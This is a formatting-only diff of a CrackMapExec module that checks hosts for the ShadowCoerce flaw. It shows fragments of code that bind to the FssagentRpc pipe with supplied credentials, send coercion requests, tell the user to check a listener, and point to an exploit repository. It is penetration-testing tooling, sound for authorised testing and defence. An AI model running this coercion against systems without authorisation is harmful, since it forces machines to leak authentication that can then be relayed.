@@ -45,9 +45,7 @@ class CMEModule:
             domain=connection.domain,
             lmhash=connection.lmhash,
             nthash=connection.nthash,
-            target=connection.host
-            if not connection.kerberos
-            else connection.hostname + "." + connection.domain,
+            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
             pipe="FssagentRpc",
             doKerberos=connection.kerberos,
             dcHost=connection.kdcHost,
@@ -64,9 +62,7 @@ class CMEModule:
                 domain=connection.domain,
                 lmhash=connection.lmhash,
                 nthash=connection.nthash,
-                target=connection.host
-                if not connection.kerberos
-                else connection.hostname + "." + connection.domain,
+                target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
                 pipe="FssagentRpc",
             )
 
@@ -86,9 +82,7 @@ class CMEModule:
 
         if result:
             context.log.highlight("VULNERABLE")
-            context.log.highlight(
-                "Next step: https://github.com/ShutdownRepo/ShadowCoerce"
-            )
+            context.log.highlight("Next step: https://github.com/ShutdownRepo/ShadowCoerce")
 
         else:
             context.log.debug("Target not vulnerable to ShadowCoerce")
@@ -211,9 +205,7 @@ class CoerceAuth:
                 "UUID": ("a8e0653c-2744-4389-a61d-7373df8b2292", "1.0"),
             },
         }
-        rpctransport = transport.DCERPCTransportFactory(
-            binding_params[pipe]["stringBinding"]
-        )
+        rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         dce = rpctransport.get_dce_rpc()
 
         if hasattr(rpctransport, "set_credentials"):
@@ -266,9 +258,7 @@ class CoerceAuth:
             dce.request(request)
         except Exception as e:
             cme_logger.debug("Something went wrong, check error status => %s", str(e))
-            cme_logger.debug(
-                "Attack may of may not have worked, check your listener..."
-            )
+            cme_logger.debug("Attack may of may not have worked, check your listener...")
             return False
 
         return True
@@ -283,9 +273,7 @@ class CoerceAuth:
             dce.request(request)
         except Exception as e:
             cme_logger.debug("Something went wrong, check error status => %s", str(e))
-            cme_logger.debug(
-                "Attack may of may not have worked, check your listener..."
-            )
+            cme_logger.debug("Attack may of may not have worked, check your listener...")
             return False
 
         return True
